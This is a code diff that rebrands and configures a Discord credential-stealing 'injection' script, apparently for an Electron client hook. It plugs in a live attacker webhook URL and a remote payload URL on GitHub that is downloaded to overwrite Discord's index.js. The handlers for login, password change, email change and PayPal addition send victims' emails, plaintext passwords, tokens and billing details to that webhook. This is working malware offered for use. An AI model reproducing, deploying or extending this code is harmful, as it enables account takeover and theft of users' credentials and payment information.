@@ -6,13 +6,13 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%',
+  webhook: 'https://discord.com/api/webhooks/1118628816693252137/6ZRG65oRylbpe-qxJNBrDFIGI64f2ecox7bNlyvFrz9k9iZH4OlKwfwFo-gfrWw5Tbxl',
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Exodus Injection', 
-  embed_icon: ''.replace(/ /g, '%20'),
+  embed_name: 'FLORIAN Injection', 
+  embed_icon: 'https://cdn.discordapp.com/avatars/544357143260692481/a_ca57386ae463ae259ef962725ffaccfd?size=512',
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js', 
 
@@ -443,7 +443,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('https://discord.com/api/webhooks/1118628816693252137/6ZRG65oRylbpe-qxJNBrDFIGI64f2ecox7bNlyvFrz9k9iZH4OlKwfwFo-gfrWw5Tbxl', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -662,17 +662,17 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
+            name: 'Account Info',
             value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
+            name: 'Discord Info',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
           },
@@ -680,6 +680,9 @@ const login = async (email, password, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+},
+        footer: {
+          text: "@FLORIAN Injection",
         },
       },
     ],
@@ -701,17 +704,17 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
+            name: 'Password Changed',
             value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: 'Discord Info',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
           },
@@ -719,6 +722,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+},
+        footer: {
+          text: "@FLORIAN Injection",
         },
       },
     ],
@@ -740,17 +746,17 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
+            name: 'Email Changed',
             value: `New Email: **${email}**\nPassword: **${password}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: 'Discord Info',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
           },
@@ -758,6 +764,9 @@ const emailChanged = async (email, password, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+},
+        footer: {
+          text: "@FLORIAN Injection",
         },
       },
     ],
@@ -779,17 +788,17 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**PayPal Added**',
+            name: 'PayPal Added',
             value: `Time to buy some nitro baby 😩`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
+            name: '<:rustler:987689935018549328> Discord Info',
             value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<a:rustler:987689940852817971> Token:',
             value: `\`${token}\``,
             inline: false,
           },
@@ -797,6 +806,9 @@ const PaypalAdded = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+},
+        footer: {
+          text: "@FLORIAN Injection",
         },
       },
     ],
